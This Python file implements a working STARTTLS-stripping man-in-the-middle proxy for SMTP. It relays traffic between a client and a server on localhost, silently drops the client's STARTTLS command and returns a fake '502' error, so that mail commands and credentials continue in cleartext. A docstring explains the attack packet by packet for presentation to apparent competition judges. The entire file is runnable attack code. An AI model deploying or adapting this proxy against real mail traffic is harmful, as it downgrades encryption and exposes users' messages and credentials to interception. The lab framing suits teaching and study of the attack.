"""
starttls_proxy.py — STARTTLS-Stripping Man-in-the-Middle Proxy

Architecture:
  CLIENT  ->  this proxy (127.0.0.1:10026)  ->  SMTP server (127.0.0.1:10025)

Attack mechanics:
  1. The real SMTP server advertises "250-STARTTLS" in its EHLO response.
     The proxy forwards this line to the client unchanged — the client
     genuinely sees STARTTLS being offered.
  2. The client sends "STARTTLS\\r\\n" to initiate the TLS upgrade.
  3. The proxy INTERCEPTS this command and returns:
         "502 5.5.1 Error: command not implemented\\r\\n"
     back to the client WITHOUT forwarding to the real server.
  4. The client's smtplib raises SMTPNotSupportedError. A non-defensive
     client catches the error and re-issues EHLO, then continues sending
     MAIL FROM / RCPT TO / DATA — in full cleartext.
  5. Everything from step 4 onward is forwarded to the real server as
     normal plaintext SMTP traffic.

Result in the PCAP:
  - Packet N:     Server ->  client  "250-STARTTLS" (offered)
  - Packet N+k:   Client ->  proxy   "STARTTLS"     (attempted)
  - Packet N+k+1: Proxy  ->  client  "502 ..."      (stripped / blocked)
  - Packet N+k+2: Client ->  proxy   "EHLO ..."     (continues in plaintext)
  - Packet N+k+3: Client ->  proxy   "MAIL FROM:..."  (credentials in the clear)

This is the packet-by-packet explanation you will give the judges.
"""
import socket
import threading

PROXY_HOST  = "127.0.0.1"
PROXY_PORT  = 10026        # clients connect here
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 10025        # real SMTP server


# --------------------------------------------------------------------------- #
#  Per-connection threads                                                      #
# --------------------------------------------------------------------------- #

def server_to_client(srv_sock: socket.socket, cli_sock: socket.socket):
    """Forward every byte from the real server to the client, unmodified."""
    try:
        while True:
            data = srv_sock.recv(4096)
            if not data:
                break
            print(f"[proxy S->C] {data!r}", flush=True)
            cli_sock.sendall(data)
    except Exception as exc:
        print(f"[proxy S->C] error: {exc}", flush=True)
    finally:
        try:
            cli_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def client_to_server(cli_sock: socket.socket, srv_sock: socket.socket):
    """
    Forward client -> server, but intercept any STARTTLS command.

    Reads complete SMTP lines (CRLF-terminated).  Any line that is exactly
    "STARTTLS" (case-insensitive) is silently dropped and replaced with a
    502 error sent back to the client.  All other lines are forwarded verbatim.
    """
    buf = b""
    try:
        while True:
            chunk = cli_sock.recv(4096)
            if not chunk:
                break
            buf += chunk

            # Process every complete CRLF-terminated line
            while b"\r\n" in buf:
                line_bytes, buf = buf.split(b"\r\n", 1)
                line_str = line_bytes.decode(errors="replace").strip()
                cmd = line_str.split()[0].upper() if line_str.split() else ""

                if cmd == "STARTTLS":
                    # ===== THE STRIPPING ATTACK =====
                    print(
                        "[proxy C->S] STARTTLS intercepted — "
                        "returning 502 to client WITHOUT forwarding to server",
                        flush=True,
                    )
                    cli_sock.sendall(b"502 5.5.1 Error: command not implemented\r\n")
                    # Do NOT forward to srv_sock — TLS upgrade never happens.
                else:
                    print(f"[proxy C->S] {line_str!r}", flush=True)
                    srv_sock.sendall(line_bytes + b"\r\n")

    except Exception as exc:
        print(f"[proxy C->S] error: {exc}", flush=True)
    finally:
        try:
            srv_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(cli_sock: socket.socket, addr):
    print(f"[proxy] New connection from {addr}", flush=True)
    try:
        srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv_sock.connect((TARGET_HOST, TARGET_PORT))
    except Exception as exc:
        print(f"[proxy] Cannot reach target server: {exc}", flush=True)
        cli_sock.close()
        return

    t1 = threading.Thread(target=server_to_client, args=(srv_sock, cli_sock), daemon=True)
    t2 = threading.Thread(target=client_to_server, args=(cli_sock, srv_sock), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    try:
        cli_sock.close()
    except Exception:
        pass
    try:
        srv_sock.close()
    except Exception:
        pass
    print(f"[proxy] Connection from {addr} closed.", flush=True)


# --------------------------------------------------------------------------- #
#  Server loop                                                                 #
# --------------------------------------------------------------------------- #

def run_proxy(stop_event=None):
    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy.bind((PROXY_HOST, PROXY_PORT))
    proxy.listen(10)
    proxy.settimeout(1.0)
    print(f"[proxy] Stripping proxy on {PROXY_HOST}:{PROXY_PORT} -> {TARGET_HOST}:{TARGET_PORT}", flush=True)

    try:
        while True:
            if stop_event and stop_event.is_set():
                break
            try:
                cli_sock, addr = proxy.accept()
                t = threading.Thread(target=handle_connection, args=(cli_sock, addr), daemon=True)
                t.start()
            except socket.timeout:
                continue
    finally:
        proxy.close()
        print("[proxy] Stopped.", flush=True)


if __name__ == "__main__":
    run_proxy()
